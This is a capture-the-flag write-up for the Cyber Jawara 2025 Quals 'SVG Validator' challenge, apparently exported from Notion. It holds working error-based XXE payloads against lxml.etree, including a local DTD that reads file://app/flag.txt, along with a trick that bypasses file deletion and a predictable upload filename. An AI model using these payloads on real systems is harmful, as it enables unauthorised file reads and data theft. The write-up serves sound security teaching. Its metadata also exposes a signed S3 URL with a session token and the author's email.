---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466QCKCR7U5%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132310Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCFtPR%2BzDrD9SfiViX%2Fcu9cJX8v2rNpbaPpY8M5HpoJTgIgPmFz9f19ApyRwrF4Zu2pt%2BFrkXT7aDsctO3LisVBCtwqiAQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPyUhGnR4pjOVl2VUyrcA7iL6t%2FlmyXxH%2FT2TLAqJrJ5UV%2BBrxjAnYk4zY0VG5ZvrJP8YGHfvX%2FXfMQphLrQGSFcs8ob2J72RBKf5AKU1nrIN%2FKikpzxlSpgyDHjmYMUORasv08p6bbR8QXc3EsF%2B2y0HVSf6cxfLh1%2FSXHYMr%2F2E8SyAP3IRh%2F7buj%2BnB4q9GrdLqigVQnAOSrFJa829fF6zm9Q5%2BHZhdKtErayDcOs1lG0IWwhdZXBO%2BvmySrEs7bP6gfrzy542YVRClstt0jf3rZwXs%2Bx5Pc1aZdut0q3UBQLErwZyMkjD%2FqKTC2NwcDJQ7ee5ihJ14NiMBa%2FSBq0pYBVOjZ79s01Ks8tic%2Fidt9ADDEXoeTJDpvny3nkdeDPl74CO%2BPRzvkL0Ah5Jhm5tsicWEwio2fk2b8lhigIq9qIMwJ%2FfI5N%2FUJgb4B0zEhcj%2BGkJYq32yvQCya62Q4hUxinqCrgADyJljUT3bz1HIjWHbathvNoUwnurf4%2FXZm29uperkAxq7EtQzqANjQBazKTg6cDHxFqiGpYDHXUZMRcghNMIiVQXdKwkgKPTVu2Ozxg95zJWm%2FWrM8v99RRyTqLDquDX7jyljTe3d01dKXvJn4FIP2D3hSfpW8irp95MmHE68aGWxmsMMjYwcEGOqUBmOmcMKcT%2FVNyaO4oQYXC0sb%2BBx%2FhkhjIlA7Y4GGeLfu2tnbyIghCplZiv9ezEaOTuNuHWbHj3ZPmlkwn1CSLuU%2FYicGUil22tNWs3SvzUWwaQtTPEJqX866T%2B6k78OA%2F05CLYiji30I6Tc7zZwRkFFzD3fPHZFFO33Kh00ocusyhTXHrRBI71s5mbEuG6mwfgg3mm1FDHH5uJyk1K7QSNrQJm%2BlU\&X-Amz-Signature=edecc4404e7fd5fcff48b37ed06e022da76bcd5f77e837d7baa515781464a9ad\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
